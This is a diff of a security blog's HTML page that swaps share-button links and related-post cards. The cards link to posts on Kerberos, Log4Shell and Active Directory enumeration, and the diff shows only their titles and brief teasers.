       <div class="resp-sharing-button resp-sharing-button--twitter resp-sharing-button--small">
         <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
@@ -1151,7 +455,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
   <li class="list-inline-item">
     
-    <a class="resp-sharing-button__link d-block" href="https://plus.google.com/share?url=https%3a%2f%2fdragonpwn.github.io%2fblog%2fblind-sql%2f" target="_blank"
+    <a class="resp-sharing-button__link d-block" href="https://plus.google.com/share?url=https%3a%2f%2fdragonpwn.github.io%2fblog%2fkerberos101%2f" target="_blank"
       rel="noopener" aria-label="">
       <div class="resp-sharing-button resp-sharing-button--google resp-sharing-button--small">
         <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
@@ -1163,7 +467,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
   <li class="list-inline-item">
     
-    <a class="resp-sharing-button__link d-block" href="mailto:?subject=Blind%20SQL%20with%20Python&amp;body=https%3a%2f%2fdragonpwn.github.io%2fblog%2fblind-sql%2f" target="_self"
+    <a class="resp-sharing-button__link d-block" href="mailto:?subject=Kerberos%20101&amp;body=https%3a%2f%2fdragonpwn.github.io%2fblog%2fkerberos101%2f" target="_self"
       rel="noopener" aria-label="">
       <div class="resp-sharing-button resp-sharing-button--email resp-sharing-button--small">
         <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
@@ -1175,7 +479,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
   <li class="list-inline-item">
     
-    <a class="resp-sharing-button__link d-block" href="whatsapp://send?text=Blind%20SQL%20with%20Python%20https%3a%2f%2fdragonpwn.github.io%2fblog%2fblind-sql%2f" target="_blank"
+    <a class="resp-sharing-button__link d-block" href="whatsapp://send?text=Kerberos%20101%20https%3a%2f%2fdragonpwn.github.io%2fblog%2fkerberos101%2f" target="_blank"
       rel="noopener" aria-label="">
       <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small">
         <div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
@@ -1211,7 +515,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
             <div class="col-md-6">
               <article class="card post-card">
   
-  <a href="https://dragonpwn.github.io/blog/kerberos101/">
+  <a href="https://dragonpwn.github.io/blog/domain-enumeration/">
     
 
 
@@ -1251,11 +555,11 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
 
 <picture>
-  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_545x0_resize_box_2.png" media="(max-width: 575px)">
-  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_600x0_resize_box_2.png" media="(max-width: 767px)">
-  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_700x0_resize_box_2.png" media="(max-width: 991px)">
-  <source srcset="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_1110x0_resize_box_2.png">
-  <img loading="lazy" decoding="async" class="w-100 h-auto rounded" src="/images/post/kerberos_huc41e8c461db695ff3a80113779d004dc_409377_1110x0_resize_box_2.png" alt="Kerberos 101" width="728" height="410">
+  <source srcset="/images/post/Enum_hud79ae7462b158694cac2a133e35ab474_90175_545x0_resize_box_2.png" media="(max-width: 575px)">
+  <source srcset="/images/post/Enum_hud79ae7462b158694cac2a133e35ab474_90175_600x0_resize_box_2.png" media="(max-width: 767px)">
+  <source srcset="/images/post/Enum_hud79ae7462b158694cac2a133e35ab474_90175_700x0_resize_box_2.png" media="(max-width: 991px)">
+  <source srcset="/images/post/Enum_hud79ae7462b158694cac2a133e35ab474_90175_1110x0_resize_box_2.png">
+  <img loading="lazy" decoding="async" class="w-100 h-auto rounded" src="/images/post/Enum_hud79ae7462b158694cac2a133e35ab474_90175_1110x0_resize_box_2.png" alt="Active Directory Enumeration" width="728" height="410">
 </picture>
  
  
@@ -1270,7 +574,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
         
       </li>
       <li class="list-inline-item mb-2">
-        <span>02 Feb, 2022</span>
+        <span>16 Feb, 2021</span>
       </li>
       <li class="list-inline-item mb-2">
         <ul class="card-meta-tag list-inline">
@@ -1283,10 +587,11 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
       </li>
     </ul>
     <h3 class="mb-3">
-      <a class="post-title" href="https://dragonpwn.github.io/blog/kerberos101/">Kerberos 101</a>
+      <a class="post-title" href="https://dragonpwn.github.io/blog/domain-enumeration/">Active Directory Enumeration</a>
     </h3>
-    <p>First of all in this blog we will discuss an authentication protocol called Kerberos.
- what is Kerberos? How does it work? Authentication flow How can …</p>
+    <p>In this part we will discus Domain Enumration using PowerView or ADModule and I&amp;rsquo;ll use PowerView.
+let&amp;rsquo;s import it
+PS C:\Users\adlab&amp;gt; . …</p>
 
     
   </div>
@@ -1296,7 +601,7 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
             <div class="col-md-6">
               <article class="card post-card">
   
-  <a href="https://dragonpwn.github.io/blog/log4shellcve-2021-44228/">
+  <a href="https://dragonpwn.github.io/blog/active-directory-intro/">
     
 
 
@@ -1336,11 +641,11 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
 
 
 <picture>
-  <source srcset="/images/post/log4shell_hu1d29f51ed5bc8fa4a3098ac94f12825c_331977_545x0_resize_box_2.png" media="(max-width: 575px)">
-  <source srcset="/images/post/log4shell_hu1d29f51ed5bc8fa4a3098ac94f12825c_331977_600x0_resize_box_2.png" media="(max-width: 767px)">
-  <source srcset="/images/post/log4shell_hu1d29f51ed5bc8fa4a3098ac94f12825c_331977_700x0_resize_box_2.png" media="(max-width: 991px)">
-  <source srcset="/images/post/log4shell_hu1d29f51ed5bc8fa4a3098ac94f12825c_331977_1110x0_resize_box_2.png">
-  <img loading="lazy" decoding="async" class="w-100 h-auto rounded" src="/images/post/log4shell_hu1d29f51ed5bc8fa4a3098ac94f12825c_331977_1110x0_resize_box_2.png" alt="Log4Shell (CVE-2021-44228)" width="728" height="410">
+  <source srcset="/images/post/intro_hu47128ddc5c83589eff2ea06e01bb9cc3_90158_545x0_resize_box_2.png" media="(max-width: 575px)">
+  <source srcset="/images/post/intro_hu47128ddc5c83589eff2ea06e01bb9cc3_90158_600x0_resize_box_2.png" media="(max-width: 767px)">
+  <source srcset="/images/post/intro_hu47128ddc5c83589eff2ea06e01bb9cc3_90158_700x0_resize_box_2.png" media="(max-width: 991px)">
+  <source srcset="/images/post/intro_hu47128ddc5c83589eff2ea06e01bb9cc3_90158_1110x0_resize_box_2.png">
+  <img loading="lazy" decoding="async" class="w-100 h-auto rounded" src="/images/post/intro_hu47128ddc5c83589eff2ea06e01bb9cc3_90158_1110x0_resize_box_2.png" alt="Introduction to Active Directory" width="728" height="410">
 </picture>
  
  
@@ -1355,28 +660,22 @@ result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#3
         
       </li>
       <li class="list-inline-item mb-2">
-        <span>17 Jan, 2022</span>
+        <span>15 Feb, 2021</span>
       </li>
       <li class="list-inline-item mb-2">
         <ul class="card-meta-tag list-inline">
           
-          <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/web">Web</a></li>
+          <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/network">Network</a></li>
           
-          <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/cves">CVEs</a></li>
-          
-          <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/rce">RCE</a></li>
+          <li class="list-inline-item"><a href="https://dragonpwn.github.io/tags/active-directory">Active-Directory</a></li>
           
         </ul>
       </li>
     </ul>
     <h3 class="mb-3">
-      <a class="post-title" href="https://dragonpwn.github.io/blog/log4shellcve-2021-44228/">Log4Shell (CVE-2021-44228)</a>
+      <a class="post-title" href="https://dragonpwn.github.io/blog/active-directory-intro/">Introduction to Active Directory</a>
     </h3>
-    <p>First of all to understand the vulnerability we should reverse it. This blog will Answer these Questions
-1- What is log4j
-2- LDAP
-3- JNDI
-4- How …</p>
+    <p>Active Directory (AD): Its a directory service used to managed windows network, Store the information on the network and makes it easily available to …</p>
 
     
   </div>
